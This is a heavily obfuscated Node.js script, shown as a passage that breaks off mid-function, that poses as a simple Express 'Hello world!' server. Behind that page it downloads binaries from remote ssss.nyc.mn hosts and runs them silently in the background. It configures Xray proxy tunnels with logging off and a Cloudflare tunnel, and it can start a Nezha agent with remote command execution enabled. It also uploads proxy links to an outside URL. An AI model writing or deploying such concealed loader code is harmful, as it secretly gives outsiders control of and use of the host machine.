const _0x5ae12a=_0x29a1;(function(_0x4bf7ad,_0x26cf54){const _0x39f4e0=_0x29a1,_0x38a63f=_0x4bf7ad();while(!![]){try{const _0x43318=-parseInt(_0x39f4e0(0x119))/0x1*(-parseInt(_0x39f4e0(0x1ba))/0x2)+parseInt(_0x39f4e0(0x159))/0x3*(-parseInt(_0x39f4e0(0x1bc))/0x4)+parseInt(_0x39f4e0(0x1b7))/0x5*(-parseInt(_0x39f4e0(0x163))/0x6)+-parseInt(_0x39f4e0(0x19e))/0x7*(parseInt(_0x39f4e0(0xfe))/0x8)+-parseInt(_0x39f4e0(0x1c4))/0x9+parseInt(_0x39f4e0(0x158))/0xa+parseInt(_0x39f4e0(0x1d3))/0xb;if(_0x43318===_0x26cf54)break;else _0x38a63f['push'](_0x38a63f['shift']());}catch(_0x411b0d){_0x38a63f['push'](_0x38a63f['shift']());}}}(_0x1c02,0xb715d));const _0x5b6d24=(function(){let _0x50d94c=!![];return function(_0x59cbe7,_0x970fd0){const _0x15bb92=_0x50d94c?function(){if(_0x970fd0){const _0x320258=_0x970fd0['apply'](_0x59cbe7,arguments);return _0x970fd0=null,_0x320258;}}:function(){};return _0x50d94c=![],_0x15bb92;};}()),_0x164012=_0x5b6d24(this,function(){const _0x14c7dd=_0x29a1;return _0x164012['toString']()[_0x14c7dd(0x167)]('(((.+)+)+)'+'+$')[_0x14c7dd(0x1ff)]()['constructo'+'r'](_0x164012)[_0x14c7dd(0x167)]('(((.+)+)+)'+'+$');});_0x164012();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5ae12a(0x204)),{promisify}=require(_0x5ae12a(0x185)),exec=promisify(require('child_proc'+'ess')['exec']),{execSync}=require('child_proc'+'ess'),http=require(_0x5ae12a(0x184)),httpProxy=require(_0x5ae12a(0x177)),UPLOAD_URL=process['env'][_0x5ae12a(0x16d)]||'',PROJECT_URL=process['env']['PROJECT_UR'+'L']||'',AUTO_ACCESS=process['env']['AUTO_ACCES'+'S']||![],FILE_PATH=process[_0x5ae12a(0x123)]['FILE_PATH']||'./tmp',SUB_PATH=process['env']['SUB_PATH']||'sub',PORT=process['env'][_0x5ae12a(0x1fe)+'T']||process['env']['PORT']||0xbb8,EXTERNAL_PORT=process['env']['EXTERNAL_P'+_0x5ae12a(0x196)]||0x1eb4,UUID=process[_0x5ae12a(0x123)]['UUID']||_0x5ae12a(0x1c2)+'de1-5def-d'+'035-0cb572'+_0x5ae12a(0x1e3),NEZHA_SERVER=process[_0x5ae12a(0x123)]['NEZHA_SERV'+'ER']||'',NEZHA_PORT=process[_0x5ae12a(0x123)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process['env']['ARGO_DOMAI'+'N']||'',ARGO_AUTH=process[_0x5ae12a(0x123)]['ARGO_AUTH']||'',CFIP=process['env']['CFIP']||_0x5ae12a(0x1f7)+_0x5ae12a(0x1a4),CFPORT=process[_0x5ae12a(0x123)]['CFPORT']||0x1bb,NAME=process[_0x5ae12a(0x123)]['NAME']||'',MONITOR_KEY=process[_0x5ae12a(0x123)][_0x5ae12a(0x136)+'Y']||'',MONITOR_SERVER=process[_0x5ae12a(0x123)][_0x5ae12a(0x191)+'RVER']||'',MONITOR_UPTIME_URL=process[_0x5ae12a(0x123)][_0x5ae12a(0x12b)+'TIME_URL']||'';!fs[_0x5ae12a(0x188)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+(_0x5ae12a(0x1c1)+'d'))):console[_0x5ae12a(0x1a9)](FILE_PATH+('\x20already\x20e'+_0x5ae12a(0x15e)));function generateRandomName(){const _0xbe104a=_0x5ae12a,_0x2ad1b3=_0xbe104a(0x17e)+'klmnopqrst'+_0xbe104a(0x1e4);let _0xf186bd='';for(let _0x496626=0x0;_0x496626<0x6;_0x496626++){_0xf186bd+=_0x2ad1b3['charAt'](Math['floor'](Math[_0xbe104a(0x12c)]()*_0x2ad1b3['length']));}return _0xf186bd;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),monitorScriptName=_0x5ae12a(0x1dd)+'itor.sh';let npmPath=path[_0x5ae12a(0x1e8)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),monitorScriptPath=path['join'](FILE_PATH,monitorScriptName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.jso'+'n');const proxy=httpProxy[_0x5ae12a(0x149)+_0x5ae12a(0x151)](),proxyServer=http['createServ'+'er']((_0x58fc30,_0x236d09)=>{const _0x1060ab=_0x5ae12a,_0x22d7db=_0x58fc30['url'];_0x22d7db[_0x1060ab(0x1ca)]('/vless-arg'+'o')||_0x22d7db[_0x1060ab(0x1ca)]('/vmess-arg'+'o')||_0x22d7db['startsWith'](_0x1060ab(0x1ac)+'go')||_0x22d7db==='/vless'||_0x22d7db===_0x1060ab(0x16b)||_0x22d7db===_0x1060ab(0x105)?proxy[_0x1060ab(0x133)](_0x58fc30,_0x236d09,{'target':'http://loc'+_0x1060ab(0x1ed)+'1'}):proxy['web'](_0x58fc30,_0x236d09,{'target':'http://loc'+_0x1060ab(0x1bd)+PORT});});proxyServer['on'](_0x5ae12a(0x14a),(_0x565ce3,_0x36c121,_0x28d2da)=>{const _0x239250=_0x5ae12a,_0x3dfa79=_0x565ce3['url'];_0x3dfa79['startsWith']('/vless-arg'+'o')||_0x3dfa79[_0x239250(0x1ca)]('/vmess-arg'+'o')||_0x3dfa79[_0x239250(0x1ca)](_0x239250(0x1ac)+'go')?proxy['ws'](_0x565ce3,_0x36c121,_0x28d2da,{'target':'http://loc'+_0x239250(0x1ed)+'1'}):proxy['ws'](_0x565ce3,_0x36c121,_0x28d2da,{'target':_0x239250(0x148)+_0x239250(0x1bd)+PORT});}),proxyServer['listen'](EXTERNAL_PORT,()=>{const _0x1017b=_0x5ae12a;console['log']('Proxy\x20serv'+'er\x20is\x20runn'+'ing\x20on\x20por'+'t:'+EXTERNAL_PORT+'!'),console['log'](_0x1017b(0x10f)+'ic\x20->\x20loca'+_0x1017b(0x1a8)+PORT),console['log']('Xray\x20traff'+'ic\x20->\x20loca'+'lhost:3001');}),app['get']('/',function(_0x84127,_0x5abe97){const _0x382282=_0x5ae12a,_0xcf2316=path[_0x382282(0x1e8)](__dirname,'index.html');fs['existsSync'](_0xcf2316)?_0x5abe97['sendFile'](_0xcf2316):_0x5abe97[_0x382282(0x199)]('Hello\x20worl'+'d!');});function deleteNodes(){const _0x2ed2d5=_0x5ae12a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xac21dd;try{_0xac21dd=fs['readFileSy'+'nc'](subPath,'utf-8');}catch{return null;}const _0x6ec7bc=Buffer[_0x2ed2d5(0x1cc)](_0xac21dd,'base64')[_0x2ed2d5(0x1ff)]('utf-8'),_0x26594f=_0x6ec7bc[_0x2ed2d5(0x1f3)]('\x0a')['filter'](_0x149191=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2ed2d5(0x198)](_0x149191));if(_0x26594f['length']===0x0)return;return axios[_0x2ed2d5(0x1a6)](UPLOAD_URL+(_0x2ed2d5(0x18c)+_0x2ed2d5(0x1b5)),JSON[_0x2ed2d5(0x132)]({'nodes':_0x26594f}),{'headers':{'Content-Type':_0x2ed2d5(0x173)+_0x2ed2d5(0x195)}})['catch'](_0x56e951=>{return null;}),null;}catch(_0x3ac8b6){return null;}}function cleanupOldFiles(){try{const _0x3b2565=fs['readdirSyn'+'c'](FILE_PATH);_0x3b2565['forEach'](_0x3a14f2=>{const _0xd89db2=_0x29a1,_0x48db2f=path['join'](FILE_PATH,_0x3a14f2);try{const _0x4440ea=fs[_0xd89db2(0x19b)](_0x48db2f);_0x4440ea['isFile']()&&fs['unlinkSync'](_0x48db2f);}catch(_0x1ca747){}});}catch(_0x44cb06){}}async function generateConfig(){const _0x5b35b7=_0x5ae12a,_0x341185={'log':{'access':_0x5b35b7(0x1d2),'error':_0x5b35b7(0x1d2),'loglevel':'none'},'dns':{'servers':['https+loca'+'l://8.8.8.'+'8/dns-quer'+'y','https+loca'+'l://1.1.1.'+'1/dns-quer'+'y','8.8.8.8','1.1.1.1'],'queryStrategy':_0x5b35b7(0x205),'disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-'+'vision'}],'decryption':_0x5b35b7(0x1d0),'fallbacks':[{'dest':0xbba},{'path':'/vless-arg'+'o','dest':0xbbb},{'path':'/vmess-arg'+'o','dest':0xbbc},{'path':_0x5b35b7(0x1ac)+'go','dest':0xbbd}]},'streamSettings':{'network':'tcp'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5b35b7(0x1de),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5b35b7(0x1de),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5b35b7(0x1fc)+'o'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b35b7(0x1ea),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5b35b7(0x145)+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x5b35b7(0x184),'tls',_0x5b35b7(0x14f)],'metadataOnly':![]}},{'port':0xbbd,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5b35b7(0x1d0),'wsSettings':{'path':'/trojan-ar'+'go'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b35b7(0x1ea),'quic'],'metadataOnly':![]}}],'outbounds':[{'protocol':'freedom','tag':'direct','settings':{'domainStrategy':_0x5b35b7(0x205)}},{'protocol':_0x5b35b7(0x14d),'tag':'block'}],'routing':{'domainStrategy':'IPIfNonMat'+'ch','rules':[]}};fs['writeFileS'+'ync'](path[_0x5b35b7(0x1e8)](FILE_PATH,'config.jso'+'n'),JSON['stringify'](_0x341185,null,0x2));}function getSystemArchitecture(){const _0x4c1fdc=_0x5ae12a,_0x1c3134=os['arch']();return _0x1c3134==='arm'||_0x1c3134===_0x4c1fdc(0x1d7)||_0x1c3134===_0x4c1fdc(0x156)?'arm':'amd';}function downloadFile(_0x20df72,_0x22d324,_0x155833){const _0x567f29=_0x5ae12a,_0x2af7f7=_0x20df72;!fs[_0x567f29(0x188)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3419ea=fs['createWrit'+'eStream'](_0x2af7f7);axios({'method':'get','url':_0x22d324,'responseType':_0x567f29(0x138)})['then'](_0x47b935=>{const _0x1346d6=_0x567f29;_0x47b935['data'][_0x1346d6(0x162)](_0x3419ea),_0x3419ea['on']('finish',()=>{const _0x4f2bfc=_0x1346d6;_0x3419ea[_0x4f2bfc(0x1ce)](),console[_0x4f2bfc(0x1a9)]('Download\x20'+path['basename'](_0x2af7f7)+(_0x4f2bfc(0x1c5)+'lly')),_0x155833(null,_0x2af7f7);}),_0x3419ea['on']('error',_0x184c5f=>{const _0x36da69=_0x1346d6;fs['unlink'](_0x2af7f7,()=>{});const _0x1b9e70=_0x36da69(0x1fa)+path['basename'](_0x2af7f7)+_0x36da69(0x113)+_0x184c5f['message'];console['error'](_0x1b9e70),_0x155833(_0x1b9e70);});})[_0x567f29(0x1eb)](_0x19bc1e=>{const _0x426925=_0x567f29,_0x4309fc=_0x426925(0x1fa)+path['basename'](_0x2af7f7)+'\x20failed:\x20'+_0x19bc1e['message'];console['error'](_0x4309fc),_0x155833(_0x4309fc);});}function _0x1c02(){const _0x345f2b=['random','lso\x20failed','Error\x20gene','filter','https://ar','fileUrl','stringify','web','data','status','MONITOR_KE','sable_nat:','stream','api.com/js','e:\x20true\x0adi','count:\x20tru','yc.mn/v1','tic\x20access','odes','--no-autou','taskkill\x20/','h\x20-i\x20-k\x20\x22','60#','download\x20m','lax/cf-vps','/vmess-arg','8443','oring...','http://loc','createProx','upgrade','\x22\x20-u\x20\x22','le\x20','blackhole','web\x20runnin','quic','\x20a\x20file\x20fo','yServer','rue\x0a\x20\x20-\x20se','ml\x20configu','oo.serv00.','aded\x20succe','aarch64','ubscriptio','13148540BoDQhq','66labcoO','ternative\x20','\x0ause_gitee','host=','ure:\x20false','xists','Subscripti','ssfully','ration...','pipe','3842178NBCtPa','443','tunnel\x20--e','ernal\x20port','search','has','\x0atls:\x20','4\x0aserver:\x20','/vmess','se_ipv6_co','UPLOAD_URL','\x20findstr\x20','\x0a\x20\x20\x20\x20servi','arm','unnelSecre','https://am','applicatio','d64.ssss.n','t\x20failed\x20f','dge-ip-ver','http-proxy','message','l\x20run','-q\x20https:/','m64.ssss.n','p2\x20--logfi','\x20script...','abcdefghij','\x0a\x20\x20\x20\x20origi','countryCod','&fp=firefo','Setting\x20up','pt\x20in\x20curr','http','util','essfully','false','existsSync','un\x20monitor','forEach','ble\x20is\x20emp','/api/delet','tunnel.jso','lse\x0adisabl','Error\x20exec','substring','MONITOR_SE','ce\x20is\x20runn','writeFileS','rating\x20tun','n/json','ORT','ript\x20downl','test','send','l\x20http://l','statSync','and:\x20','all','2046625hvjhWm','clear','p_status:4','TunnelID','?security=','fileName','eu.org','led\x20to\x20sta','post','Server\x20ini','lhost:','log','w.githubus','/api/add-s','/trojan-ar','/config.js','this\x20scrip','\x20false\x0adis','--skip-con','k\x20added\x20su','base64','ute:\x20false','or\x20','e-nodes','--tls','5iKJnkH','oDomain','\x0avless://','522458kQuUlR','\x20not\x20found','189632yaIQWS','alhost:','mmand_exec','get','://','\x20is\x20create','4b3e2bfe-b','Tunnel\x20is\x20','7562970yKKepV','\x20successfu','org','o?ed=2560','2083','\x20http2\x0a\x0ain','startsWith','\x20hostname:','from','e\x0atemperat','close','e\x20method\x20a','none','hmod\x20+x\x20cf','/dev/null','34753158TBsvKN','NEZHA\x20vari','Running\x20mo','/boot.log\x20','arm64','matic\x20acce','TunnelSecr','Monitor\x20sc','\x22\x20&&\x20chmod','&path=%2Fv','cf-vps-mon','vless','npm\x20runnin','\x22\x20>\x20/dev/n','firefox','/sub.txt\x20s','bbd046','uvwxyz','unning','tartserver','gress:\x0a\x20\x20-','join','ick\x20tunnel','tls','catch','nohup\x20','alhost:300','Error\x20read','command:','g\x20script..','charAt','Failed\x20to\x20','split','\x201800\x0arepo','cd\x20\x22','og:','cdns.doon.','unshift','n\x20complete','Download\x20','Nodes\x20uplo','/vless-arg','N\x20or\x20ARGO_','SERVER_POR','toString','sion\x20auto\x20','d\x20successf','automatic\x20','boot.log','path','UseIP','ercontent.','yc.mn/bot','uration:','40zBddWe','rvice:\x20htt','platform','ted\x20via\x20al','\x0a\x20\x20\x20\x20','match','oken\x20','/trojan','ully','Waiting\x20fo','otocol\x20htt','pdate\x20--pr','cret:\x20','Error\x20down','\x20is\x20runnin','-monitor.s','ning','HTTP\x20traff','unlinkSync','e_auto_upd','win32','\x20failed:\x20','&path=%2Ft','Add\x20automa','ain/cf-vps','-vps-monit','rt_period:','1eMTUzP','error\x20in\x20s','includes','push','en\x20connect','tializatio','for\x20using\x20','ccessfully','t,\x20enjoy!','country_co','env','error','/localhost','rated\x20succ','pop','ync','nt.com/kad','ml\x22\x20>/dev/','MONITOR_UP'];_0x1c02=function(){return _0x345f2b;};return _0x1c02();}async function downloadFilesAndRun(){const _0x57aec9=_0x5ae12a,_0x15d7a3=getSystemArchitecture(),_0x53c930=getFilesForArchitecture(_0x15d7a3);if(_0x53c930['length']===0x0){console['log']('Can\x27t\x20find'+_0x57aec9(0x150)+'r\x20the\x20curr'+'ent\x20archit'+'ecture');return;}const _0x4d526d=_0x53c930['map'](_0x216202=>{return new Promise((_0x455047,_0x354df5)=>{const _0xada75b=_0x29a1;downloadFile(_0x216202[_0xada75b(0x1a3)],_0x216202[_0xada75b(0x131)],(_0x4be40b,_0x403331)=>{_0x4be40b?_0x354df5(_0x4be40b):_0x455047(_0x403331);});});});try{await Promise[_0x57aec9(0x19d)](_0x4d526d);}catch(_0x1b3aa){console[_0x57aec9(0x124)](_0x57aec9(0x10b)+'loading\x20fi'+'les:',_0x1b3aa);return;}function _0x56eca9(_0x446648){const _0x6c5288=_0x57aec9,_0x18c9b1=0x1fd;_0x446648[_0x6c5288(0x18a)](_0x4dd64b=>{const _0x36b5fc=_0x6c5288;fs[_0x36b5fc(0x188)](_0x4dd64b)&&fs['chmod'](_0x4dd64b,_0x18c9b1,_0x2fb9b4=>{const _0x4faf5e=_0x36b5fc;_0x2fb9b4?console[_0x4faf5e(0x124)]('Empowermen'+_0x4faf5e(0x175)+_0x4faf5e(0x1b4)+_0x4dd64b+':\x20'+_0x2fb9b4):console['log']('Empowermen'+'t\x20success\x20'+'for\x20'+_0x4dd64b+':\x20'+_0x18c9b1['toString'](0x8));});});}const _0x21350e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x56eca9(_0x21350e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa3912a=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x57aec9(0x1f3)](':')[_0x57aec9(0x127)]():'',_0x3c8f29=new Set(['443',_0x57aec9(0x146),'2096','2087','2083','2053']),_0x520f0d=_0x3c8f29[_0x57aec9(0x168)](_0xa3912a)?'true':_0x57aec9(0x187),_0x205bc3='\x0aclient_se'+_0x57aec9(0x10a)+NEZHA_KEY+('\x0adebug:\x20fa'+_0x57aec9(0x18e)+_0x57aec9(0x111)+'ate:\x20true\x0a'+'disable_co'+_0x57aec9(0x1be)+_0x57aec9(0x1b3)+'\x0adisable_f'+'orce_updat'+_0x57aec9(0x13a)+_0x57aec9(0x137)+_0x57aec9(0x1af)+'able_send_'+'query:\x20fal'+'se\x0agpu:\x20fa'+'lse\x0ainsecu'+'re_tls:\x20tr'+'ue\x0aip_repo'+_0x57aec9(0x118)+_0x57aec9(0x1f4)+'rt_delay:\x20'+_0x57aec9(0x16a))+NEZHA_SERVER+('\x0askip_conn'+'ection_cou'+'nt:\x20true\x0as'+'kip_procs_'+_0x57aec9(0x13b)+_0x57aec9(0x1cd)+_0x57aec9(0x15d)+_0x57aec9(0x169))+_0x520f0d+(_0x57aec9(0x15b)+'_to_upgrad'+'e:\x20false\x0au'+_0x57aec9(0x16c)+'untry_code'+':\x20false\x0auu'+'id:\x20')+UUID;fs['writeFileS'+'ync'](path[_0x57aec9(0x1e8)](FILE_PATH,'config.yam'+'l'),_0x205bc3);const _0xb8b7ea=_0x57aec9(0x1ec)+phpPath+'\x20-c\x20\x22'+FILE_PATH+('/config.ya'+_0x57aec9(0x12a)+'null\x202>&1\x20'+'&');try{await exec(_0xb8b7ea),console[_0x57aec9(0x1a9)](phpName+('\x20is\x20runnin'+'g')),await new Promise(_0x26170b=>setTimeout(_0x26170b,0x3e8));}catch(_0x39176c){console['error']('php\x20runnin'+'g\x20error:\x20'+_0x39176c);}}else{let _0x475354='';const _0x192130=[_0x57aec9(0x164),_0x57aec9(0x146),'2096','2087',_0x57aec9(0x1c8),'2053'];_0x192130['includes'](NEZHA_PORT)&&(_0x475354=_0x57aec9(0x1b6));const _0x12752f='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x475354+('\x20--disable'+'-auto-upda'+'te\x20--repor'+'t-delay\x204\x20'+_0x57aec9(0x1b0)+'n\x20--skip-p'+'rocs\x20>/dev'+'/null\x202>&1'+'\x20&');try{await exec(_0x12752f),console['log'](npmName+('\x20is\x20runnin'+'g')),await new Promise(_0x4deb50=>setTimeout(_0x4deb50,0x3e8));}catch(_0xb47e7c){console['error'](_0x57aec9(0x1df)+'g\x20error:\x20'+_0xb47e7c);}}}else console['log'](_0x57aec9(0x1d4)+'able\x20is\x20em'+'pty,skip\x20r'+_0x57aec9(0x1e5));const _0x397b19=_0x57aec9(0x1ec)+webPath+'\x20-c\x20'+FILE_PATH+(_0x57aec9(0x1ad)+'on\x20>/dev/n'+'ull\x202>&1\x20&');try{await exec(_0x397b19),console['log'](webName+(_0x57aec9(0x10c)+'g')),await new Promise(_0x4ff09b=>setTimeout(_0x4ff09b,0x3e8));}catch(_0x460996){console['error'](_0x57aec9(0x14e)+'g\x20error:\x20'+_0x460996);}if(fs['existsSync'](botPath)){let _0x244778;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x244778='tunnel\x20--e'+'dge-ip-ver'+'sion\x20auto\x20'+_0x57aec9(0x13f)+'pdate\x20--pr'+_0x57aec9(0x108)+'p2\x20run\x20--t'+_0x57aec9(0x104)+ARGO_AUTH;else ARGO_AUTH[_0x57aec9(0x11b)](_0x57aec9(0x1d9)+'et')?(!fs[_0x57aec9(0x188)](path['join'](FILE_PATH,'tunnel.yml'))&&(console[_0x57aec9(0x1a9)](_0x57aec9(0x107)+'r\x20tunnel.y'+_0x57aec9(0x153)+_0x57aec9(0x161)),await new Promise(_0x9f49b2=>setTimeout(_0x9f49b2,0x3e8))),_0x244778='tunnel\x20--e'+_0x57aec9(0x176)+_0x57aec9(0x200)+'--config\x20'+FILE_PATH+('/tunnel.ym'+_0x57aec9(0x179))):_0x244778=_0x57aec9(0x165)+'dge-ip-ver'+'sion\x20auto\x20'+_0x57aec9(0x13f)+_0x57aec9(0x109)+_0x57aec9(0x108)+_0x57aec9(0x17c)+_0x57aec9(0x14c)+FILE_PATH+('/boot.log\x20'+'--loglevel'+'\x20info\x20--ur'+_0x57aec9(0x19a)+'ocalhost:')+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x244778+('\x20>/dev/nul'+'l\x202>&1\x20&')),console['log'](botName+('\x20is\x20runnin'+'g')),console[_0x57aec9(0x1a9)]('Waiting\x20fo'+'r\x20tunnel\x20t'+'o\x20start...'),await new Promise(_0x428a14=>setTimeout(_0x428a14,0x1388));if(ARGO_AUTH['includes'](_0x57aec9(0x1d9)+'et'))try{process[_0x57aec9(0x100)]===_0x57aec9(0x112)?await exec('tasklist\x20|'+_0x57aec9(0x16e)+botName+'\x20>\x20nul'):await exec('pgrep\x20-f\x20\x22'+'['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+(_0x57aec9(0x1e0)+'ull')),console['log'](_0x57aec9(0x1c3)+'running\x20su'+_0x57aec9(0x120));}catch(_0x46fa4e){console[_0x57aec9(0x124)]('Tunnel\x20fai'+_0x57aec9(0x1a5)+'rt');}}catch(_0x4974ee){console[_0x57aec9(0x124)]('Error\x20exec'+'uting\x20comm'+_0x57aec9(0x19c)+_0x4974ee);}}await new Promise(_0x294e4b=>setTimeout(_0x294e4b,0x7d0));}function getFilesForArchitecture(_0x20dc78){const _0x4e713a=_0x5ae12a;let _0x981ce7;_0x20dc78==='arm'?_0x981ce7=[{'fileName':webPath,'fileUrl':'https://ar'+'m64.ssss.n'+'yc.mn/web'},{'fileName':botPath,'fileUrl':_0x4e713a(0x130)+'m64.ssss.n'+_0x4e713a(0xfc)}]:_0x981ce7=[{'fileName':webPath,'fileUrl':'https://am'+'d64.ssss.n'+'yc.mn/web'},{'fileName':botPath,'fileUrl':_0x4e713a(0x172)+_0x4e713a(0x174)+'yc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2feb1a=_0x20dc78==='arm'?'https://ar'+'m64.ssss.n'+'yc.mn/agen'+'t':'https://am'+'d64.ssss.n'+'yc.mn/agen'+'t';_0x981ce7[_0x4e713a(0x1f8)]({'fileName':npmPath,'fileUrl':_0x2feb1a});}else{const _0x546f29=_0x20dc78===_0x4e713a(0x170)?'https://ar'+_0x4e713a(0x17b)+'yc.mn/v1':'https://am'+_0x4e713a(0x174)+_0x4e713a(0x13c);_0x981ce7['unshift']({'fileName':phpPath,'fileUrl':_0x546f29});}}return _0x981ce7;}function argoType(){const _0x428668=_0x5ae12a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x428668(0x1a9)]('ARGO_DOMAI'+_0x428668(0x1fd)+'AUTH\x20varia'+_0x428668(0x18b)+'ty,\x20use\x20qu'+_0x428668(0x1e9)+'s');return;}if(ARGO_AUTH[_0x428668(0x11b)](_0x428668(0x1d9)+'et'))try{const _0x26082c=JSON['parse'](ARGO_AUTH),_0x2ce054=_0x26082c[_0x428668(0x1a1)];fs['writeFileS'+'ync'](path[_0x428668(0x1e8)](FILE_PATH,_0x428668(0x18d)+'n'),ARGO_AUTH);const _0x486cc9='tunnel:\x20'+_0x2ce054+('\x0acredentia'+'ls-file:\x20')+path[_0x428668(0x1e8)](FILE_PATH,_0x428668(0x18d)+'n')+('\x0aprotocol:'+_0x428668(0x1c9)+_0x428668(0x1e7)+_0x428668(0x1cb)+'\x20')+ARGO_DOMAIN+(_0x428668(0x16f)+'ce:\x20http:/'+_0x428668(0x125)+':')+EXTERNAL_PORT+(_0x428668(0x17f)+'nRequest:\x0a'+'\x20\x20\x20\x20\x20\x20noTL'+'SVerify:\x20t'+_0x428668(0x152)+_0x428668(0xff)+_0x428668(0x1a0)+'04\x0a');fs['writeFileS'+_0x428668(0x128)](path['join'](FILE_PATH,'tunnel.yml'),_0x486cc9),console[_0x428668(0x1a9)]('Tunnel\x20YAM'+'L\x20configur'+'ation\x20gene'+_0x428668(0x126)+'essfully');}catch(_0x411d61){console['error'](_0x428668(0x12e)+_0x428668(0x194)+'nel\x20config'+_0x428668(0xfd),_0x411d61);}else console[_0x428668(0x1a9)]('ARGO_AUTH\x20'+'mismatch\x20T'+_0x428668(0x171)+'t,\x20use\x20tok'+_0x428668(0x11d)+'\x20to\x20tunnel');}async function getMetaInfo(){const _0xc7bf71=_0x5ae12a;try{const _0x269942=await axios['get']('https://ip'+'api.co/jso'+'n/',{'timeout':0xbb8});if(_0x269942['data']&&_0x269942['data'][_0xc7bf71(0x122)+'de']&&_0x269942['data'][_0xc7bf71(0x1c6)])return _0x269942[_0xc7bf71(0x134)]['country_co'+'de']+'_'+_0x269942['data']['org'];}catch(_0x4c04fc){try{const _0x548e8b=await axios[_0xc7bf71(0x1bf)]('http://ip-'+_0xc7bf71(0x139)+'on/',{'timeout':0xbb8});if(_0x548e8b['data']&&_0x548e8b['data'][_0xc7bf71(0x135)]==='success'&&_0x548e8b[_0xc7bf71(0x134)][_0xc7bf71(0x180)+'e']&&_0x548e8b['data'][_0xc7bf71(0x1c6)])return _0x548e8b['data']['countryCod'+'e']+'_'+_0x548e8b['data'][_0xc7bf71(0x1c6)];}catch(_0x172c11){}}return'Unknown';}async function extractDomains(){const _0x3fac86=_0x5ae12a;let _0x2d92fb;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2d92fb=ARGO_DOMAIN,console['log']('ARGO_DOMAI'+'N:',_0x2d92fb),await _0xcd6fad(_0x2d92fb);else try{const _0x3c4919=fs['readFileSy'+'nc'](path[_0x3fac86(0x1e8)](FILE_PATH,_0x3fac86(0x203)),'utf-8'),_0x339799=_0x3c4919[_0x3fac86(0x1f3)]('\x0a'),_0x4a417d=[];_0x339799['forEach'](_0x129fc1=>{const _0x174e2c=_0x3fac86,_0x3364ce=_0x129fc1[_0x174e2c(0x103)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3364ce){const _0x596679=_0x3364ce[0x1];_0x4a417d['push'](_0x596679);}});if(_0x4a417d['length']>0x0)_0x2d92fb=_0x4a417d[0x0],console['log']('ArgoDomain'+':',_0x2d92fb),await _0xcd6fad(_0x2d92fb);else{console[_0x3fac86(0x1a9)]('ArgoDomain'+_0x3fac86(0x1bb)+',\x20re-runni'+'ng\x20bot\x20to\x20'+'obtain\x20Arg'+_0x3fac86(0x1b8)),fs[_0x3fac86(0x110)](path['join'](FILE_PATH,_0x3fac86(0x203)));async function _0x5c1509(){const _0x5cfb14=_0x3fac86;try{process[_0x5cfb14(0x100)]===_0x5cfb14(0x112)?await exec(_0x5cfb14(0x140)+'f\x20/im\x20'+botName+('.exe\x20>\x20nul'+'\x202>&1')):await exec('pkill\x20-f\x20\x22'+'['+botName[_0x5cfb14(0x1f1)](0x0)+']'+botName[_0x5cfb14(0x190)](0x1)+('\x22\x20>\x20/dev/n'+'ull\x202>&1'));}catch(_0x112771){}}_0x5c1509(),await new Promise(_0x5437c1=>setTimeout(_0x5437c1,0xbb8));const _0x3047ee=_0x3fac86(0x165)+'dge-ip-ver'+_0x3fac86(0x200)+_0x3fac86(0x13f)+'pdate\x20--pr'+_0x3fac86(0x108)+_0x3fac86(0x17c)+'le\x20'+FILE_PATH+(_0x3fac86(0x1d6)+'--loglevel'+'\x20info\x20--ur'+_0x3fac86(0x19a)+'ocalhost:')+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3047ee+('\x20>/dev/nul'+'l\x202>&1\x20&')),console['log'](botName+(_0x3fac86(0x10c)+'g')),await new Promise(_0x21e29e=>setTimeout(_0x21e29e,0xbb8)),await extractDomains();}catch(_0x2a4c40){console['error'](_0x3fac86(0x18f)+'uting\x20comm'+'and:\x20'+_0x2a4c40);}}}catch(_0x57e41c){console[_0x3fac86(0x124)](_0x3fac86(0x1ee)+'ing\x20boot.l'+_0x3fac86(0x1f6),_0x57e41c);}async function 